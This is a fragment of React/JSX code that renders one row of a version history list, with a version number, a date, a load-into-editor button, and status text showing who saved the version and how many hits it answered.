    <li className={cn("grid grid-cols-[22px_44px_minmax(0,1fr)_auto] items-baseline gap-2.5 px-3 py-[5px] text-body", current && "bg-soot-2")}>
      <span className="text-label text-smoke">v{v.version}</span>
      <span className="font-semibold">{dayOrTime(v.createdAt)}</span>
      <button type="button" className="cursor-pointer truncate text-left text-smoke hover:text-bone" title={`Load v${v.version} into the editor`} onClick={onLoad}>{what}</button>
      <span className="text-label whitespace-nowrap text-ash">{current ? (live ? "active · " : "saved · not served yet · ") : ""}{v.savedBy === "claude" ? "by Claude · " : ""}answered {plural(v.hits ?? 0, "hit")}{decoys}{depth}</span>
    </li>
  );
}
